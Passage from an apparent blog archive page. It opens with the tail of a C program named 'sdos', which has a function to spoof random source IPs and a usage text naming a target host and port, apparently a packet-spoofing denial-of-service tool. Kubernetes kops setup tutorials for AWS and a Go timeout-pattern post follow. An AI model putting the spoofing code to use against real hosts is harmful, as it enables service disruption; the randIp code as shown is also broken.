	{
		printf(&quot;Packet transmission failed!\n&quot;);
		return 1;
	}
	//Data send successfully
	else
	{
		printf(&quot;Packet transmission success!\n&quot;);
		return 1;
	}
}

/**
 * randIp
 *
 * Will generate a random IP address to spoof the packet with
 */
char* randIp()
{
	char *ip;
	sprintf(ip,
			&quot;%d.%d.%d.%d&quot;,
			rand() &amp; 126,
			rand() &amp; 255,
			rand() &amp; 255,
			rand() &amp; 255);
	printf(&quot;Random IP: %s\n&quot;, ip);
	return ip;
}

/**
 * usage
 *
 * How do we run this thing
 */
void usage()
{
	printf(&quot;./sdos &lt;options&gt;\n&quot;);
	printf(&quot;\n&quot;);
	printf(&quot;v     Verbose - Enables verbosity\n&quot;);
	printf(&quot;h     Host    - IP of host to connect to\n&quot;);
	printf(&quot;p     Port    - The numerical port to connect on\n&quot;);
	printf(&quot;m     Message - Optional message to send to the server\n&quot;);
	printf(&quot;\n&quot;);

}
</pre>
				</p>
	</div>
</div>
</div><!-- #post-## --><div id="post-140" class="post-140 post type-post status-publish format-standard has-post-thumbnail hentry category-k8s tag-aws tag-deploy tag-ha tag-highly-available tag-kops tag-kris tag-kubernetes tag-nova">
<div class="blog_post_wrapper_main">
      <div class="blog_thumbnail"> 
	   
		<img width="600" height="339" src="../../../../wp-content/uploads/2016/12/kubernetes-thumb.png" class="attachment-full size-full wp-post-image" alt="" srcset="../../../../wp-content/uploads/2016/12/kubernetes-thumb.png 600w, ../../../../wp-content/uploads/2016/12/kubernetes-thumb-300x170.png 300w" sizes="(max-width: 600px) 100vw, 600px" />	  	  </div>
</div>
<div class="blog_mk_title">
<h3><a href="../../../../setting-up-a-kubernetes-cluster-in-aws-with-kops-1-5-0/index.html">Setting up an HA Kubernetes Cluster in AWS with private topology with kops 1.5.1</a></h3>
</div>
<div class="blog_desc blog_details_desc mar_b_30">
	<div class="bottom">
	<span class="posted-on"> <a href="../../../../setting-up-a-kubernetes-cluster-in-aws-with-kops-1-5-0/index.html" rel="bookmark"><time class="entry-date published" datetime="2017-02-07T05:47:52+00:00">February 7, 2017</time><time class="updated" datetime="2017-03-02T03:22:35+00:00">March 2, 2017</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../index.html">Kris Nova</a></span></span>  
		<span class="link_icon">
		<a href="../../../../setting-up-a-kubernetes-cluster-in-aws-with-kops-1-5-0/index.html"><i class="fa fa-chevron-right"></i></a>
		</span>
	</div>
	<div class="blog_content">
		<p><p>Today we announce the release of <a href="https://github.com/kubernetes/kops">Kubernetes kops 1.5.1 LTS</a>!</p>
<p>I figured what better way to announce the release, than with an updated blog post on setting up an HA cluster on private topology with the new release!</p>
<h1>What we are building</h1>
<p>In this tutorial we will cover setting up a HA privately networked Kubernetes cluster in AWS with <a href="https://github.com/kubernetes/kops">Kubernetes kops 1.5.1</a>.</p>
<ul>
<li>Fully managed VPC in AWS, with automatically generated private, and public subnets.</li>
<li>Outbound traffic managed through a NAT gateway and elastic IP in each private subnet.</li>
<li>Classic ELB fronting the Kubernetes API on TCP 443 (No firewall holes for the cluster).</li>
<li>Classic ELB fronting a bastion ASG for resilient SSH access for admins.</li>
<li>HA (Highly Available) Kubernetes masters spread across multiple availability zones in an ASG.</li>
<li>Kubernetes nodes spread across multiple availability zones in an ASG.</li>
<li>Public DNS alias for the Kubernetes API.</li>
</ul>
<p><img src="https://raw.githubusercontent.com/kris-nova/kops-demo/master/ha-master-private/k8s-aws-ha-private-master.png" /></p>
<h1>Installing kops 1.5.1</h1>
<p><a href="https://github.com/kubernetes/kops">Kubernetes kops</a>Â is an open source tool that Kubernetes offers that can be used for deploying Kubernetes clusters in AWS. We will be using the tool in this tutorial.</p>
<pre class="brush: plain; title: ; notranslate" title="">

curl -sSL https://github.com/kubernetes/kops/releases/download/1.5.1/kops-darwin-amd64 -O
chmod +x kops-darwin-amd64
sudo mv kops-darwin-amd64 /usr/local/bin

</pre>
<p>More information on installing kops can be found <a href="https://github.com/kubernetes/kops#installation">here</a> for our non OS X users.</p>
<h1>Installing kubectl</h1>
<p>We will also be needing a tool calledÂ <strong>kubectl</strong>. Think of this as a thin CLI client for the Kubernetes API, similar to theÂ <strong>aws</strong> CLIÂ tool we will be installing next.</p>
<pre class="brush: plain; title: ; notranslate" title="">
curl -O https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/darwin/amd64/kubectl
chmod +x kubectl
sudo mv kubectl /usr/local/bin
</pre>
<h1>Setting up your AWS environment</h1>
<h3>Get your AWS credentials from the console</h3>
<p>Use the AWS console to get an AWS AccessKeyId and AWS SecretAccessKey <a href="http://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSGettingStartedGuide/AWSCredentials.html">Official Documentaion.</a> After you have your credentials, download the CLI tool and configure it with your new user. You can also use any method defined <a href="https://docs.aws.amazon.com/sdk-for-go/v1/developer-guide/configuring-sdk.html#specifying-credentials">here</a>.</p>
<pre class="brush: plain; title: ; notranslate" title="">
brew update &amp;&amp; brew install awscli
aws configure
</pre>
<p>We strongly recommend using a single user with a select few IAM permissions to run kops. Thankfully kops provides a handy IAM creation script that will create a new user with the correct permissions. Be sure to note your new AccessKeyId and SecretAccessKey for the next step.</p>
<pre class="brush: plain; title: ; notranslate" title="">
curl -O https://raw.githubusercontent.com/kubernetes/kops/master/hack/new-iam-user.sh
sh new-iam-user.sh &lt;group&gt; &lt;user&gt;
aws iam list-users
</pre>
<h3>Setting upÂ DNS for your cluster</h3>
<p>We will need a publicly resolvable domain name for our cluster. So we need to make sure we have a hosted zone setup in Route53. In this example we will be usingÂ <strong>nivenly.com</strong>Â for our example hosted zone.</p>
<pre class="brush: plain; title: ; notranslate" title=""> ID=$(uuidgen) &amp;&amp; aws route53 create-hosted-zone --name nivenly.com --caller-reference $ID </pre>
<p>More information on <a href="https://github.com/kubernetes/kops/blob/master/docs/aws.md#configure-dns">more advanced DNS setup</a>.</p>
<h3>Setting up a state store for your cluster</h3>
<p>Kops will store a representation of your Kubernetes cluster in AWS S3. This is called the kops <strong>state store</strong>. It is important to note that kops <strong>DOES NOT</strong> store any concept of what resources are deployed. That would create two sources of truth (The AWS API, and the state store). Rather, kops will merely store a definition of the Kubernetes cluster, that will then be applied to AWS via kops.</p>
<p>We will call our state store in this exampleÂ <strong>nivenly-com-state-store</strong>.</p>
<pre class="brush: plain; title: ; notranslate" title=""> aws s3api create-bucket --bucket nivenly-com-state-store --region us-east-1 </pre>
<h1>Creating your first cluster</h1>
<h3>Getting ready</h3>
<p>Okay! We are ready to start creating our first cluster.Â Lets first set up a few environmental variables to make this process as clean as possible.</p>
<pre class="brush: plain; title: ; notranslate" title="">
export NAME=myfirstcluster.nivenly.com
export KOPS_STATE_STORE=s3://nivenly-com-state-store
</pre>
<h3>Form your create cluster command</h3>
<p>We will need to note which availability zones are available to us. These are different for every AWS account. In this example we will be deploying our cluster to theÂ <strong>us-west-1</strong> region.</p>
<pre class="brush: plain; title: ; notranslate" title=""> aws ec2 describe-availability-zones --region us-west-1 </pre>
<p>Lets form our create cluster command. Here we want to define a few things.</p>
<ul>
<li><strong>&#8211;node-count 3 </strong>
<ul>
<li>We want 3 Kubernetes nodes</li>
</ul>
</li>
<li><strong>&#8211;zones us-west-2a,us-west-2b,us-west-2c</strong>
<ul>
<li>We want to run our nodes spread across the 3 availability zones available to our account</li>
<li>This is a CSV list, pulled from the API in the previous request</li>
</ul>
</li>
<li><strong>&#8211;master-zones us-west-2a,us-west-2b,us-west-2cÂ </strong>
<ul>
<li>This will tell kops to spread masters across those availability zones.</li>
<li>Because there is more than 1, this will automatically be ran in HA.</li>
</ul>
</li>
<li><strong>&#8211;dns-zone nivenly.com</strong>
<ul>
<li>We define the DNS hosted zone we created earlier</li>
</ul>
</li>
<li><strong>&#8211;node-size t2.large</strong>
<ul>
<li>We set our nodes to a defined instance size</li>
</ul>
</li>
<li><strong>&#8211;master-size t2.large</strong>
<ul>
<li>We set our masters to a defined instance size</li>
</ul>
</li>
<li><strong>&#8211;topology privateÂ </strong>
<ul>
<li>We define that we want to use a private network topology with kops.</li>
<li>This is what tells kops to build the diagram above.</li>
</ul>
</li>
<li><strong>&#8211;networking calicoÂ </strong>
<ul>
<li>We tell kops to use Calico for our overlay network</li>
<li>Overlay networks are required for this configuration.</li>
<li>Many thanks to our friends at <a href="http://docs.projectcalico.org/v2.0/getting-started/kubernetes/installation/hosted/">Calico</a> for helping us get this into kops!</li>
</ul>
</li>
<li><strong>&#8211;bastion</strong>
<ul>
<li>Add this flag to tell kops to create a bastion server so you can SSH into the cluster</li>
</ul>
</li>
</ul>
<p>Kops will default toÂ <strong>~/.ssh/id_rsa.pub</strong> for backend access. You can override this withÂ <strong><span class="s1">&#8211;ssh-public-key /path/to/key.pub</span></strong></p>
<pre class="brush: plain; title: ; notranslate" title="">
kops create cluster \
    --node-count 3 \
    --zones us-west-2a,us-west-2b,us-west-2c \
    --master-zones us-west-2a,us-west-2b,us-west-2c \
    --dns-zone nivenly.com \
    --node-size t2.large \
    --master-size t2.large \
    --topology private \
    --networking calico \
    --bastion \
    ${NAME}
</pre>
<p>kops will deploy these instances using AWS auto scaling groups, so each instance should be ephemeral and will rebuild itself if taken offline for any reason.</p>
<h3>Cluster Configuration</h3>
<p>We now have created the underlying cluster configuration, lets take a look at every aspect that will define our cluster.</p>
<pre class="brush: plain; title: ; notranslate" title=""> kops edit cluster ${NAME} </pre>
<p>This will open up the cluster config (that is actually stored in the S3 bucket we created earlier!) in your favorite text editor. Here is where we can optionally really tweak our cluster for our use case. In this tutorial, we leave it default for now.</p>
<p>For more information on these directives, and the kops API please checkout the kops official <a href="https://github.com/kubernetes/kops/tree/master/docs">documentation</a></p>
<h3>Apply theÂ changes</h3>
<p>Okay, we are ready to create the cluster in AWS. We do so running the following command.</p>
<pre class="brush: plain; title: ; notranslate" title=""> kops update cluster ${NAME} --yes </pre>
<h3>Start using the cluster</h3>
<p>The resources will be deployed asynchronously here. So even though kops has finished, that does not mean our cluster is built. A great way to check if the cluster is online, and the API is working is to use <strong>kubectl</strong></p>
<pre class="brush: plain; title: ; notranslate" title=""> kubectl get nodes </pre>
<p>After we verify the API is responding, we can now use the Kubernetes cluster.</p>
<h3>Backend SSH access</h3>
<p>We should also now have a bastion server behind an elastic load balancer in AWS that will give us access to the cluster over SSH. Grab the bastion ELB A record, and the instance private IP you want to access from the AWS console and SSH into the bastion as follows.</p>
<pre class="brush: plain; title: ; notranslate" title=""> 
ssh-add ~/.ssh/id_rsa
ssh -A admin@bastion.myfirstcluster.nivenly.com
ssh admin@&lt;master_private_ip&gt;
</pre>
<p><a class="github-button" href="https://github.com/kris-nova" data-style="mega" data-count-href="/kris-nova/followers" data-count-api="/users/kris-nova#followers" data-count-aria-label="# followers on GitHub">Follow @kris-nova</a></p>
				</p>
	</div>
</div>
</div><!-- #post-## --><div id="post-74" class="post-74 post type-post status-publish format-standard has-post-thumbnail hentry category-k8s tag-aws tag-cluster tag-deploy tag-install tag-k8s tag-kops tag-kubernetes tag-nat tag-nat-gateway tag-networking tag-private tag-private-networking tag-route-table tag-subnet tag-vpc">
<div class="blog_post_wrapper_main">
      <div class="blog_thumbnail"> 
	   
		<img width="600" height="339" src="../../../../wp-content/uploads/2016/12/kubernetes-thumb.png" class="attachment-full size-full wp-post-image" alt="" srcset="../../../../wp-content/uploads/2016/12/kubernetes-thumb.png 600w, ../../../../wp-content/uploads/2016/12/kubernetes-thumb-300x170.png 300w" sizes="(max-width: 600px) 100vw, 600px" />	  	  </div>
</div>
<div class="blog_mk_title">
<h3><a href="../../../../index.html@p=74.html">How to set up a HA privately networked Kubernetes cluster in AWS with kops</a></h3>
</div>
<div class="blog_desc blog_details_desc mar_b_30">
	<div class="bottom">
	<span class="posted-on"> <a href="../../../../index.html@p=74.html" rel="bookmark"><time class="entry-date published" datetime="2016-12-07T05:56:58+00:00">December 7, 2016</time><time class="updated" datetime="2017-03-20T01:35:04+00:00">March 20, 2017</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../index.html">Kris Nova</a></span></span>  
		<span class="link_icon">
		<a href="../../../../index.html@p=74.html"><i class="fa fa-chevron-right"></i></a>
		</span>
	</div>
	<div class="blog_content">
		<p><h1>This post is DEPRECATED</h1>
<p>Please check out the <a href="../../../../setting-up-a-kubernetes-cluster-in-aws-with-kops-1-5-0/index.html">most recent article instead.</a></p>
<h1>What we are building</h1>
<p>In this tutorial we will cover setting up a HA privately networked Kubernetes cluster in AWS with <a href="https://github.com/kubernetes/kops">Kubernetes kops</a>.</p>
<ul>
<li>Fully private VPC, housing utility and private subnets, with hybrid cloud capabilities over VPN</li>
<li>HA (Highly Available) masters spread across availability zones with private subnetting</li>
<li>Nodes spread across availability zones with private subnetting</li>
<li>Routing between subnets with NAT gateways</li>
<li>Elastic Load Balancers in front of the resources for public access</li>
<li>Bastion server for backend SSH access to the instances</li>
</ul>
<h1>Installing kops</h1>
<p><a href="https://github.com/kubernetes/kops">Kubernetes kops</a>Â is an open source tool that Kubernetes offers that can be used for deploying Kubernetes clusters against different cloud providers. We will be using the tool to help us with the heavy lifting in this tutorial.</p>
<p>Start by installing the most recent version of kops from the master branch.</p>
<pre class="brush: plain; title: ; notranslate" title="">

brew update &amp;&amp; brew install --HEAD kops

</pre>
<p>More information on installing kops can be found <a href="https://github.com/kubernetes/kops#installation">here</a> for our non OS X users.</p>
<h1>Installing kubectl</h1>
<p>We will also be needing a tool calledÂ <strong>kubectl</strong>. Think of this as a thin CLI client for the Kubernetes API, similar to theÂ <strong>aws</strong> CLIÂ tool we will be installing next.</p>
<p>You can download the tarball from the <a href="https://github.com/kubernetes/kubernetes/releases/latest">Kubernetes latest release</a>Â page in github, or follow the official install guide <a href="http://kubernetes.io/docs/user-guide/prereqs/">here</a>.</p>
<pre class="brush: plain; title: ; notranslate" title="">
wget -O https://github.com/kubernetes/kubernetes/releases/download/v1.4.6/kubernetes.tar.gz
sudo cp kubernetes/platforms/darwin/amd64/kubectl /usr/local/bin/kubectl
</pre>
<h1>Setting up your AWS environment</h1>
<h3>Setting up a kops IAM user</h3>
<p>In this example we will be using a dedicated IAM user to use with kops. This user will need basic API security credentials in order to use kops. Create the user and credentials using the AWS console. <a href="http://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSGettingStartedGuide/AWSCredentials.html">More information.</a></p>
<p>Kubernetes kops uses the official AWS Go SDK, so all we need to do here is set up your system to use the official AWS supported methods of registering security credentials definedÂ <a href="https://docs.aws.amazon.com/sdk-for-go/v1/developer-guide/configuring-sdk.html#specifying-credentials">here</a>. Here is an example using the <code>aws</code>Â command line tool to set up your security credentials.</p>
<pre class="brush: plain; title: ; notranslate" title="">
brew update &amp;&amp; brew install awscli
aws configure
aws iam list-users
</pre>
<p>We should now be able to pull a list of IAM users from the API, verifying that our credentials are working as expected.</p>
<h3>Setting upÂ DNS for your cluster</h3>
<p>We will need a publicly resolvable domain name for our cluster. So we need to make sure we have a hosted zone setup in Route53. In this example we will be usingÂ <strong>nivenly.com</strong>Â for our example hosted zone.</p>
<pre class="brush: plain; title: ; notranslate" title=""> ID=$(uuidgen) &amp;&amp; aws route53 create-hosted-zone --name nivenly.com --caller-reference $ID </pre>
<h3>Setting up a state store for your cluster</h3>
<p>In this example we will be creating a dedicated S3 bucket for kops to use. This is where kops will store the state of your cluster and the representation of your cluster, and serves as the source of truth for our cluster configuration throughout the process. We will call thisÂ <strong>nivenly-com-state-store</strong>. I recommend keeping the creation confined toÂ <strong>us-east-1</strong>, otherwise more input will be needed here.</p>
<pre class="brush: plain; title: ; notranslate" title=""> aws s3api create-bucket --bucket nivenly-com-state-store --region us-east-1 </pre>
<h1>Creating your first cluster</h1>
<h3>Setup your environment for kops</h3>
<p>Okay! We are ready to start creating our first cluster.Â Lets first set up a few environmental variables to make this process as clean as possible.</p>
<pre class="brush: plain; title: ; notranslate" title="">
export NAME=myfirstcluster.nivenly.com
export KOPS_STATE_STORE=s3://nivenly-com-state-store
</pre>
<p>Note: You don&#8217;t have to use environmental variables here. You can always define the values using the <strong>&#8211;name</strong> and <strong>&#8211;state</strong> flags later.</p>
<h3>Form your create cluster command</h3>
<p>We will need to note which availability zones are available to us. In this example we will be deploying our cluster to theÂ <strong>us-west-1</strong> region.</p>
<pre class="brush: plain; title: ; notranslate" title=""> aws ec2 describe-availability-zones --region us-west-1 </pre>
<p>Lets form our create cluster command. Here we want to define a few things.</p>
<ul>
<li><strong>&#8211;node-count 3 </strong>
<ul>
<li>We want 3 Kubernetes nodes</li>
</ul>
</li>
<li><strong>&#8211;zones us-west-2a,us-west-2b,us-west-2c</strong>
<ul>
<li>We want to run our nodes spread across the 3 availability zones available to our account</li>
<li>This is a CSV list, pulled from the API in the previous request</li>
</ul>
</li>
<li><strong>&#8211;master-zones us-west-2a,us-west-2b,us-west-2cÂ </strong>
<ul>
<li>This will tell kops that we want 3 masters, running in HA in these 3 availability zones</li>
</ul>
</li>
<li><strong>&#8211;dns-zone nivenly.com</strong>
<ul>
<li>We define the DNS hosted zone we created earlier</li>
</ul>
</li>
<li><strong>&#8211;node-size t2.medium</strong>
<ul>
<li>We set our nodes to a defined instance size</li>
</ul>
</li>
<li><strong>&#8211;master-size t2.medium</strong>
<ul>
<li>We set our masters to a slightly larger instance size</li>
</ul>
</li>
<li><strong>&#8211;topology privateÂ </strong>
<ul>
<li>We define that we want to use a private network topology with kops</li>
</ul>
</li>
<li><strong>&#8211;networking weaveÂ </strong>
<ul>
<li>We tell kops to use Weave for our overlay network</li>
<li>Many thanks to our friends at <a href="https://www.weave.works/">Weave</a> for helping us make this a staple part of our clusters!</li>
</ul>
</li>
<li><strong>&#8211;imageÂ </strong><strong>293135079892/k8s-1.4-debian-jessie-amd64-hvm-ebs-2016-11-16</strong>
<ul>
<li>This is required as a temporary workaround until kopsÂ <strong>1.4.2</strong> is released (Estimated Dec 17, 2016)</li>
</ul>
</li>
</ul>
<p>Kops will default toÂ <strong>~/.ssh/id_rsa.pub</strong> for backend access. You can override this withÂ <strong><span class="s1">&#8211;ssh-public-key /path/to/key.pub</span></strong></p>
<pre class="brush: plain; title: ; notranslate" title="">
kops create cluster \
    --node-count 3 \
    --zones us-west-2a,us-west-2b,us-west-2c \
    --master-zones us-west-2a,us-west-2b,us-west-2c \
    --dns-zone nivenly.com \
    --node-size t2.medium \
    --master-size t2.medium \
    --topology private \
    --networking weave \
    --image 293135079892/k8s-1.4-debian-jessie-amd64-hvm-ebs-2016-11-16 \
    ${NAME}
</pre>
<p>kops will deploy these instances using AWS auto scaling groups, so each instance should be ephemeral and will rebuild itself if taken offline for any reason.</p>
<h3>Cluster Configuration</h3>
<p>We now have created the underlying cluster configuration, lets take a look at every aspect that will define our cluster.</p>
<pre class="brush: plain; title: ; notranslate" title=""> kops edit cluster ${NAME} </pre>
<p>This will open up the cluster config (that is actually stored in the S3 bucket we created earlier!) in your favorite text editor. Here is where we can optionally really tweak our cluster for our use case. In this tutorial, we leave it default for now.</p>
<p>For more information on these directives, and the kops API please checkout the kops official <a href="https://github.com/kubernetes/kops/tree/master/docs">documentation</a></p>
<h3>Apply theÂ changes</h3>
<p>Okay, we are ready to create the cluster in AWS. We do so running the following command.</p>
<pre class="brush: plain; title: ; notranslate" title=""> kops update cluster ${NAME} --yes </pre>
<h3>Start using the cluster</h3>
<p>The resources will be deployed asynchronously here. So even though kops has finished, that does not mean our cluster is built. A great way to check if the cluster is online, and the API is working is to use <strong>kubectl</strong></p>
<pre class="brush: plain; title: ; notranslate" title=""> kubectl get nodes </pre>
<p>After we verify the API is responding, we can now use the Kubernetes cluster.</p>
<h3>Backend SSH access</h3>
<p>We should also now have a bastion server behind an elastic load balancer in AWS that will give us access to the cluster over SSH. Grab the bastion ELB A record, and the instance private IP you want to access from the AWS console and SSH into the bastion as follows.</p>
<pre class="brush: plain; title: ; notranslate" title=""> 
ssh -A admin@&lt;bastion_elb_a_record&gt;
ssh admin@&lt;instance_private_ip&gt;
</pre>
<h3>What do you think?</h3>
<p>I always love comments, and suggestions on how to be better. Let me know your thoughts, if you have any good ones.</p>
<p>I wrote a lot of the code for the features in this article, feel free to hit me up on github if you want to follow along!</p>
<p><a class="github-button" href="https://github.com/kris-nova" data-style="mega" data-count-href="/kris-nova/followers" data-count-api="/users/kris-nova#followers" data-count-aria-label="# followers on GitHub">Follow @kris-nova</a></p>
				</p>
	</div>
</div>
</div><!-- #post-## --><div id="post-40" class="post-40 post type-post status-publish format-standard hentry category-go tag-concurrent tag-factory tag-function tag-go tag-golang tag-hang tag-switch tag-timeout tag-timeouts">
<div class="blog_post_wrapper_main">
      <div class="blog_thumbnail"> 
	  	  </div>
</div>
<div class="blog_mk_title">
<h3><a href="../../../../index.html@p=40.html">Timeout factories</a></h3>
</div>
<div class="blog_desc blog_details_desc mar_b_30">
	<div class="bottom">
	<span class="posted-on"> <a href="../../../../index.html@p=40.html" rel="bookmark"><time class="entry-date published" datetime="2016-11-28T01:18:58+00:00">November 28, 2016</time><time class="updated" datetime="2016-11-28T04:48:29+00:00">November 28, 2016</time></a></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="../../index.html">Kris Nova</a></span></span>  
		<span class="link_icon">
		<a href="../../../../index.html@p=40.html"><i class="fa fa-chevron-right"></i></a>
		</span>
	</div>
	<div class="blog_content">
		<p><h2>Suppose you want to execute a function, and you expect it to complete in a pre defined amount of time..</h2>
<p>Maybe you just don&#8217;t care about the result if you can&#8217;t get it quickly.</p>
<p>Timeout patterns in golang are very useful if you want to <strong>fail quickly</strong>. Particularly in regard to web programming or socket programming.</p>
<p>The idea behind a timeout is handy, but a pain to code over and over. Here is a clever example of a concurrent timeout implementation, as well as an example on channel factories.</p>
<h2>Timeout</h2>
<p>Timeouts are the idea that the code should move forward based on an arbitrary defined amount of time, if another task has not completed.</p>
<h2>Concurrent Factories</h2>
<p>Concurrent factories are ways of generating channels in go, that look and feel the same, but can have different implementations.</p>
<p>In the case of the code below, the <code>getTimeoutChannel</code> function behaves as a concurrent factory.</p>
<p><a href="https://github.com/Nivenly/nivenly.com/blob/master/examples/go/concurrent_factories.go"><span class="hidden-xs"> View on GitHub </span><span class="octicon octicon-mark-github" aria-hidden="true"></span></a></p>
<pre class="brush: golang; title: ; notranslate" title="">

package main

import (
	&quot;time&quot;
	&quot;fmt&quot;
)

// Will call the getTimeoutChannel factory function, passing in different sleep times for each channel
func main() {
	ch_a := getTimeoutChannel(1) // 1 sec
	ch_b := getTimeoutChannel(2) // 2 sec
	ch_c := getTimeoutChannel(5) // 5 sec
	switch {
	case &lt;-ch_a:
		fmt.Println(&quot;Channel A&quot;)
		break
	case &lt;-ch_b:
		fmt.Println(&quot;Channel B&quot;)
		break
	case &lt;-ch_c:
		fmt.Println(&quot;Channel C&quot;)
		break
	}
}

// Will generate a new channel, and concurrently run a sleep based on the input
// Will return true after the sleep is over
func getTimeoutChannel(N int) chan bool {
	ch := make(chan bool)
	go func() {
		time.Sleep(time.Second * time.Duration(N))
		ch &lt;- true
	}()
	return ch
}

</pre>
<p><a class="github-button" href="https://github.com/kris-nova" data-style="mega" data-count-href="/kris-nova/followers" data-count-api="/users/kris-nova#followers" data-count-aria-label="# followers on GitHub" aria-label="Follow @kris-nova on GitHub">Follow @kris-nova</a></p>
<h2>What happened?</h2>
<p>We started 3 concurrent timeout factories, each with a unique channel. Each of the channels will timeout and return a value, after the defined sleep. In this example <code>ch_a</code> will obviously timeout first, as it only sleeps for 1 second.</p>
<p>The <code>switch</code> statement will hang until one of the 3 channels returns a value. After the <code>switch</code> statement detects a value from a channel, it performs the logic for the corresponding <code>case</code>. This allows us to easily pick and chose which avenue the code should progress with further.</p>
<h2>When is this useful?</h2>
<p>Imagine if <code>ch_a</code> and <code>ch_b</code> were <strong>not</strong> timeout channels but rather actual logic in your program. Imagine if <code>ch_a</code> was actually a read from a cache, and <code>ch_b</code> was actually a read from a database.</p>
<p>Let&#8217;s say the 2 second timeout, was actually a 2 second cache read. The program shouldn&#8217;t really care if the cache read is successful or not. If it is taking 2 seconds, then it is hardly doing it&#8217;s job as a quick cache anyway. So the program should be smart enough to use whatever value is returned <strong>first</strong> and <strong>not</strong> whatever value <strong>should</strong> be returned first. In this case, the database read.</p>
<p>Now we are in a situation where we implemented a cache, and for whatever reason the cache doesn&#8217;t seem to want to return a value. Perhaps updating the cache would be in order?</p>
<p>We can take our example one step further and keep the 5 second timeout on <code>ch_c</code>. For the sake of our experimental program, 5 seconds should be more than enough time for any of the supported avenues to return a meaningful value. If after the 5 seconds has elapsed and the first two channels haven&#8217;t reported any valuable data we should consider the system in a state of catastrophic failure, and report back accordingly. Simply add the failure path to the program, and rest assured that the program will handle even the most unexpected of edge cases quickly, and meaningfully.</p>
<p>Now, doesn&#8217;t that seem like a great way to structure a program? </p>
				</p>
	</div>
</div>
</div><!-- #post-## -->
	<nav class="navigation pagination" role="navigation">
		<h2 class="screen-reader-text">Posts navigation</h2>
		<div class="nav-links"><a class="prev page-numbers" href="../2/index.html">PREVIOUS</a>
<a class='page-numbers' href='../../index.html'>1</a>
<a class='page-numbers' href='../2/index.html'>2</a>
<span class='page-numbers current'>3</span>
<a class='page-numbers' href='../4/index.html'>4</a>
<a class="next page-numbers" href="../4/index.html">NEXT</a></div>
	</nav>		</main><!-- #main -->
		</div><!-- #primary -->
				</div>
				</div>
	</div>
</div>
<footer>
  <div class="wrapper_main footer_section_main">
   <div class="container">
    <div class="row">
     <div class="col-lg-3 col-md-3 col-sm-3">
      <div class="footer_logo"> 
	  		   <h1 style="mk_copy"><a href="../../../../../nivenly.com/index.html"></a></h1> 
       	  </div>
     </div>
     <div class="col-lg-6 col-md-6 col-sm-6">
      <p class="footer_copyright">Copyright 2017 Kris Nova <a href="../../../../../nivenly.com/index.html"></a></p>
     </div>
     <div class="col-lg-3 col-md-3 col-sm-3">
      <div class="social_icons footer_social">
	  </div>
     </div>
    </div>
   </div>
  </div>
 </footer>
</div>
<script type='text/javascript' src='../../../../wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js@ver=3.0.9b'></script>
<script type='text/javascript' src='../../../../wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushXml.js@ver=3.0.9b'></script>
<script type='text/javascript' src='../../../../wp-content/plugins/golang-brush-for-syntaxhighlighter-evolved/shBrushGo.js@ver=1.0.0'></script>
<script type='text/javascript' src='../../../../wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPlain.js@ver=3.0.9b'></script>
<script type='text/javascript' src='../../../../wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushCpp.js@ver=3.0.9b'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://www.nivenly.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
		var themecssurl = "https://www.nivenly.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeMidnight.css?ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['auto-links'] = false;
	SyntaxHighlighter.defaults['gutter'] = false;
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();
</script>
<link rel='stylesheet' id='captcha-style-css'  href='../../../../wp-content/plugins/uber-nocaptcha-recaptcha/assets/css/style.css@ver=4.8.11.css' type='text/css' media='all' />
<script type='text/javascript'>
/* <![CDATA[ */
var wpcf7 = {"apiSettings":{"root":"https:\/\/www.nivenly.com\/wp-json\/","namespace":"contact-form-7\/v1"},"recaptcha":{"messages":{"empty":"Please verify that you are not a robot."}}};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/contact-form-7/includes/js/scripts.js@ver=4.8'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var sta_settings = {"distance":"50","speed":"5000","exceptions":""};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/scroll-to-anchor/js/scroll-to-anchor.min.js@ver=4.8.11'></script>
<script type='text/javascript' src='../../../../wp-content/themes/micky/assets/js/bootstrap.min.js'></script>
<script type='text/javascript' src='../../../../wp-content/themes/micky/assets/js/bootstrap-select-min.js'></script>
<script type='text/javascript' src='../../../../wp-content/themes/micky/assets/js/navigation.js@ver=20151215'></script>
<script type='text/javascript' src='../../../../wp-content/themes/micky/assets/js/skip-link-focus-fix.js@ver=20151215'></script>
<script type='text/javascript' src='../../../../wp-content/themes/micky/assets/js/custom.js'></script>
